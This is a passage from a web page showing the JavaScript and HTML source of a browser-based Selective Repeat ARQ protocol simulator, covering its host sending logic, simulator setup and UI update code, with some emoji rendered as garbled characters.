class="keyword">else</span> <span class="keyword">if</span> (currentFS.binIndex &lt; currentFS.frame.length - <span class="number">8</span>) &#123;</span><br><span class="line">                        anotherUI.LogInfo(<span class="string">&quot;ğŸ”´ Manually corrupted a bit &#123; checksum &#125; of frame &quot;</span> + currentFS.sequence + (currentFS.controlFrame ? <span class="string">&quot; (control frame)&quot;</span> : <span class="string">&quot;&quot;</span>), <span class="string">&quot;receiveBinBufferLog&quot;</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        anotherUI.LogInfo(<span class="string">&quot;ğŸ”´ Manually corrupted a bit &#123; end &#125; of frame &quot;</span> + currentFS.sequence + (currentFS.controlFrame ? <span class="string">&quot; (control frame)&quot;</span> : <span class="string">&quot;&quot;</span>), <span class="string">&quot;receiveBinBufferLog&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (destHost.ui) &#123;</span><br><span class="line">                    destHost.ui.errorArr.push(<span class="built_in">this</span>.sentBitCnt - <span class="number">1</span>)</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// ================================================================================</span></span><br><span class="line"></span><br><span class="line">            currentFS.binIndex++;</span><br><span class="line">            <span class="keyword">if</span> (currentFS.controlFrame == <span class="literal">true</span> &amp;&amp; currentFS.binIndex == currentFS.frame.length) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;  ğŸ”µHost&quot;</span> + <span class="built_in">this</span>.id + <span class="string">&quot; sent control frame &quot;</span> + currentFS.sequence + <span class="string">&quot; to host &quot;</span> + currentFS.receiverID);</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.ui) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.ui.LogInfo(<span class="string">&quot;&amp;nbsp;&amp;nbsp;ğŸ”µ Sent control frame &quot;</span> + currentFS.sequence, <span class="string">&quot;frameSenderBufferLog&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// remove current frame from the buffer due to it&#x27;s control frame and has been sent</span></span><br><span class="line">                <span class="built_in">this</span>.frameSender.splice(currentFrameIndex, <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">this</span>.sendingFrame = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (currentFS.timeout == <span class="literal">null</span> &amp;&amp; currentFS.feedback == <span class="literal">false</span>) &#123;</span><br><span class="line">                currentFS.timeout = <span class="built_in">this</span>.tickCnt + <span class="built_in">this</span>.sim.para.timeout;</span><br><span class="line">                <span class="comment">// log a message to say that timeout is set</span></span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;  âŒšHost &quot;</span> + <span class="built_in">this</span>.id + <span class="string">&quot; timer started for frame &quot;</span> + currentFS.sequence + <span class="string">&quot; to host &quot;</span> + currentFS.receiverID);</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.ui) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.ui.LogInfo(<span class="string">&quot;&amp;nbsp;&amp;nbsp;âŒš Timer started for frame &quot;</span> + currentFS.sequence, <span class="string">&quot;frameSenderBufferLog&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                currentFS.status = FrameSenderStatus.WaitingAck;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">SendMessage</span>(<span class="params">message, receiverID</span>)</span> &#123;</span><br><span class="line">        <span class="comment">// Generate frames and add it to the frameSender</span></span><br><span class="line">        <span class="keyword">var</span> frameList = FrameHelper.MakeFrameFromeText(receiverID, <span class="built_in">this</span>.id, <span class="built_in">this</span>.sendWinSeq, message, <span class="built_in">this</span>.sim.para.maxFrLen);</span><br><span class="line">        <span class="built_in">this</span>.sendWinSeq = (<span class="built_in">this</span>.sendWinSeq + frameList.length) % <span class="built_in">this</span>.sim.para.seq;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; frameList.length; i++) &#123;</span><br><span class="line">            <span class="built_in">this</span>.LoadFrameToSender(frameList[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>    </div></div><div class='spoiler collapsed'>    <div class='spoiler-title'>        Simulator Class    </div>    <div class='spoiler-content'>        <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Simulator</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">initHostNum, para</span>)</span> &#123;</span><br><span class="line">        <span class="comment">// JS grammar trap: even these parameters have default values, you can&#x27;t use foo(a,c=xxx) to escape parameter b</span></span><br><span class="line">        <span class="comment">// so why don&#x27;t I use &#123;&#125; to wrap the parameters</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.hostList = [];</span><br><span class="line">        <span class="keyword">var</span> timeout = para.timeout;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;Timeout is: &quot;</span> + timeout + <span class="string">&quot;ms according to the tick and frame length&quot;</span>)</span><br><span class="line">        <span class="built_in">this</span>.para = &#123;</span><br><span class="line">            seq: para.seq, <span class="comment">// Squence has 4 bits if SEQ = 16</span></span><br><span class="line">            winLen: para.windowlen, <span class="comment">// Window length</span></span><br><span class="line">            tick: para.tick, <span class="comment">// Tick in milliseconds</span></span><br><span class="line">            minFrLen: para.minFrameLen, <span class="comment">// Minimum frame length</span></span><br><span class="line">            maxFrLen: para.maxFrameLen, <span class="comment">// Maximum frame length</span></span><br><span class="line">            corRate: para.corruptionRate, <span class="comment">// Corruption rate of the channel</span></span><br><span class="line">            timeout: timeout <span class="comment">// Timeout in tick, meaning after how many ticks the sender will resend the frame</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; initHostNum; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> _ = <span class="keyword">new</span> Host(<span class="built_in">this</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">FindHostById</span>(<span class="params">id</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.hostList.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.hostList[i].id == id)</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.hostList[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>    </div></div><div class='spoiler collapsed'>    <div class='spoiler-title'>        HostUI Class    </div>    <div class='spoiler-content'>        <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HostUI</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">host, simulator</span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.host = host;</span><br><span class="line">        <span class="built_in">this</span>.host.ui = <span class="built_in">this</span>;</span><br><span class="line">        <span class="built_in">this</span>.sim = simulator;</span><br><span class="line">        <span class="built_in">this</span>.messageBuffer = [];</span><br><span class="line">        <span class="built_in">this</span>.errorArr = [];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// hostX_userInput, input textare</span></span><br><span class="line">        <span class="built_in">this</span>.userInputUI = <span class="built_in">document</span>.getElementById(<span class="string">&quot;host&quot;</span> + host.id + <span class="string">&quot;_userInput&quot;</span>);</span><br><span class="line">        <span class="comment">// hostX_sendButton, button</span></span><br><span class="line">        <span class="built_in">this</span>.sendButtonUI = <span class="built_in">document</span>.getElementById(<span class="string">&quot;host&quot;</span> + host.id + <span class="string">&quot;_sendButton&quot;</span>);</span><br><span class="line">        <span class="comment">// hostX_frameSenderBuffer, div</span></span><br><span class="line">        <span class="built_in">this</span>.frameSenderUI = <span class="built_in">document</span>.getElementById(<span class="string">&quot;host&quot;</span> + host.id + <span class="string">&quot;_frameSenderBuffer&quot;</span>);</span><br><span class="line">        <span class="comment">// hostX_receiveBinBuffer, div</span></span><br><span class="line">        <span class="built_in">this</span>.receiveBinBufferUI = <span class="built_in">document</span>.getElementById(<span class="string">&quot;host&quot;</span> + host.id + <span class="string">&quot;_receiveBinBuffer&quot;</span>);</span><br><span class="line">        <span class="comment">// hostX_frameReceiverBuffer, div</span></span><br><span class="line">        <span class="built_in">this</span>.frameReceiverUI = <span class="built_in">document</span>.getElementById(<span class="string">&quot;host&quot;</span> + host.id + <span class="string">&quot;_frameReceiverBuffer&quot;</span>);</span><br><span class="line">        <span class="comment">// hostX_message, textarea</span></span><br><span class="line">        <span class="built_in">this</span>.messageUI = <span class="built_in">document</span>.getElementById(<span class="string">&quot;host&quot;</span> + host.id + <span class="string">&quot;_message&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.sendButtonUI.onclick = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.userInputUI.value != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.host.SendMessage(<span class="built_in">this</span>.userInputUI.value, <span class="built_in">this</span>.host.id == <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        host.UpperLayerFunc = <span class="built_in">this</span>.ShowInMessageUI.bind(<span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// set interval to update the UI</span></span><br><span class="line">        <span class="built_in">this</span>.uiTicker = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.Update();</span><br><span class="line">        &#125;, <span class="built_in">this</span>.sim.para.tick / <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">LogInfo</span>(<span class="params">message, logger</span>)</span> &#123;</span><br><span class="line">        <span class="comment">// log a message to the host_&#123;logger&#125;</span></span><br><span class="line">        <span class="comment">// logger: frameSenderBufferLog, receiveBinBufferLog</span></span><br><span class="line">        <span class="keyword">var</span> logUI = <span class="built_in">document</span>.getElementById(<span class="string">&quot;host&quot;</span> + <span class="built_in">this</span>.host.id + <span class="string">&quot;_&quot;</span> + logger);</span><br><span class="line">        <span class="keyword">if</span> (logUI != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> date = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">            <span class="keyword">var</span> time = date.toLocaleTimeString() + <span class="string">&quot;: &quot;</span>;</span><br><span class="line">            logUI.innerHTML += message + <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            logUI.scrollTop = logUI.scrollHeight;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">ShowInMessageUI</span>(<span class="params">message</span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.messageUI.value = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> date = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">        <span class="keyword">var</span> time = date.toLocaleTimeString();</span><br><span class="line">        <span class="built_in">this</span>.messageBuffer.push(&#123; <span class="attr">message</span>: message, <span class="attr">time</span>: time &#125;);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.messageBuffer.length; i++) &#123;</span><br><span class="line">            <span class="built_in">this</span>.messageUI.value += <span class="built_in">this</span>.messageBuffer[i].time + <span class="string">&quot; | &quot;</span> + bytes2str(<span class="built_in">this</span>.messageBuffer[i].message) + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// scroll to the bottom</span></span><br><span class="line">        <span class="built_in">this</span>.messageUI.scrollTop = <span class="built_in">this</span>.messageUI.scrollHeight;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">Update</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.UpdateFrameSenderUI();</span><br><span class="line">        <span class="built_in">this</span>.UpdateReceiveBinBufferUI();</span><br><span class="line">        <span class="built_in">this</span>.UpdateFrameReceiveBufferUI();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">UpdateFrameSenderUI</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.frameSenderUI.innerHTML = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="comment">// remove all child</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">this</span>.frameSenderUI.firstChild) &#123;</span><br><span class="line">            <span class="built_in">this</span>.frameSenderUI.removeChild(<span class="built_in">this</span>.frameSenderUI.firstChild);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.host.frameSender.length; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> frSenderInfo = <span class="built_in">this</span>.host.frameSender[i];</span><br><span class="line">            <span class="keyword">var</span> frameUI = <span class="built_in">document</span>.createElement(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">            frameUI.className = <span class="string">&quot;frame&quot;</span>;</span><br><span class="line">            frameUI.innerHTML = FrameHelper.DisplayFrameInText(frSenderInfo.frame);</span><br><span class="line">            <span class="comment">// adjust text size</span></span><br><span class="line">            frameUI.style.fontSize = <span class="number">3</span> + <span class="string">&quot;px&quot;</span>;</span><br><span class="line">            <span class="comment">// adjust text color</span></span><br><span class="line">            <span class="keyword">if</span> (frSenderInfo.status == FrameSenderStatus.Sending) &#123;</span><br><span class="line">                frameUI.style.color = <span class="string">&quot;rgb(51, 204, 255)&quot;</span>; <span class="comment">// blue</span></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (frSenderInfo.status == FrameSenderStatus.Acked) &#123;</span><br><span class="line">                frameUI.style.color = <span class="string">&quot;rgb(51, 255, 0)&quot;</span>; <span class="comment">// green</span></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (frSenderInfo.status == FrameSenderStatus.Queuing) &#123;</span><br><span class="line">                frameUI.style.color = <span class="string">&quot;white&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (frSenderInfo.status == FrameSenderStatus.Timeout) &#123;</span><br><span class="line">                frameUI.style.color = <span class="string">&quot;rgb(255, 51, 51)&quot;</span>; <span class="comment">// red</span></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (frSenderInfo.status == FrameSenderStatus.WaitingAck) &#123;</span><br><span class="line">                frameUI.style.color = <span class="string">&quot;rgb(255, 236, 139)&quot;</span>; <span class="comment">// yellow</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">this</span>.frameSenderUI.appendChild(frameUI);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">UpdateReceiveBinBufferUI</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="comment">// Update errorArr, drop expired errors</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.errorArr.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.errorArr[i] &lt; <span class="built_in">this</span>.host.processedBitCnt) &#123;</span><br><span class="line">                <span class="built_in">this</span>.errorArr.splice(i, <span class="number">1</span>);</span><br><span class="line">                i--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> binText = binArray2CubeText(<span class="built_in">this</span>.host.receiveBinBuffer);</span><br><span class="line">        <span class="built_in">this</span>.receiveBinBufferUI.innerHTML = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="comment">// remove all child</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">this</span>.receiveBinBufferUI.firstChild) &#123;</span><br><span class="line">            <span class="built_in">this</span>.receiveBinBufferUI.removeChild(<span class="built_in">this</span>.receiveBinBufferUI.firstChild);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; binText.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.errorArr.indexOf(i + <span class="built_in">this</span>.host.processedBitCnt) == -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.receiveBinBufferUI.innerHTML += binText[i];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// append span child</span></span><br><span class="line">                <span class="keyword">var</span> span = <span class="built_in">document</span>.createElement(<span class="string">&quot;span&quot;</span>);</span><br><span class="line">                span.className = <span class="string">&quot;error&quot;</span>;</span><br><span class="line">                span.innerHTML = binText[i];</span><br><span class="line">                <span class="built_in">this</span>.receiveBinBufferUI.appendChild(span);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">8</span> == <span class="number">7</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.receiveBinBufferUI.innerHTML += <span class="string">&quot; &quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// scroll to bottom</span></span><br><span class="line">        <span class="built_in">this</span>.receiveBinBufferUI.scrollTop = <span class="built_in">this</span>.receiveBinBufferUI.scrollHeight;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.errorArr.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.receiveBinBufferUI.style.border = <span class="string">&quot;3px solid green&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.errorArr.length &gt; <span class="number">0</span> &amp;&amp; <span class="built_in">this</span>.errorArr.length &lt; <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.receiveBinBufferUI.style.border = <span class="string">&quot;3px solid red&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">UpdateFrameReceiveBufferUI</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.frameReceiverUI.innerHTML = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="comment">// remove all child</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">this</span>.frameReceiverUI.firstChild) &#123;</span><br><span class="line">            <span class="built_in">this</span>.frameReceiverUI.removeChild(<span class="built_in">this</span>.frameReceiverUI.firstChild);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.host.receiveFrameBuffer.length; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> extractedFrame = <span class="built_in">this</span>.host.receiveFrameBuffer[i];</span><br><span class="line">            <span class="keyword">var</span> frameUI = <span class="built_in">document</span>.createElement(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">            frameUI.className = <span class="string">&quot;tempFrame&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (extractedFrame == <span class="literal">null</span>) &#123;</span><br><span class="line">                frameUI.innerHTML = <span class="string">&quot;&#123; ----------------------------------- &#125;&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">var</span> dataStr = bytes2str(extractedFrame.data);</span><br><span class="line">                <span class="keyword">if</span> (dataStr.length &gt; <span class="number">25</span>) &#123;</span><br><span class="line">                    dataStr = dataStr.slice(<span class="number">0</span>, <span class="number">25</span>) + <span class="string">&quot;...&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                frameUI.innerHTML = <span class="string">&quot;&#123; &quot;</span> + dataStr + <span class="string">&quot; &#125;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            frameUI.style.textAlign = <span class="string">&quot;center&quot;</span>;</span><br><span class="line">            frameUI.style.fontSize = <span class="number">5</span> + <span class="string">&quot;px&quot;</span>;</span><br><span class="line">            <span class="built_in">this</span>.frameReceiverUI.appendChild(frameUI);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>    </div></div><p>For <code>index.html</code></p><div class='spoiler collapsed'>    <div class='spoiler-title'>        index.html    </div>    <div class='spoiler-content'>        <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Selective Repeat ARQ<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- make background black --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">        <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">background-color</span>: <span class="number">#23252F</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">color</span>: <span class="number">#AAC5FF</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-tag">span</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">color</span>: <span class="built_in">rgb</span>(<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>);</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span 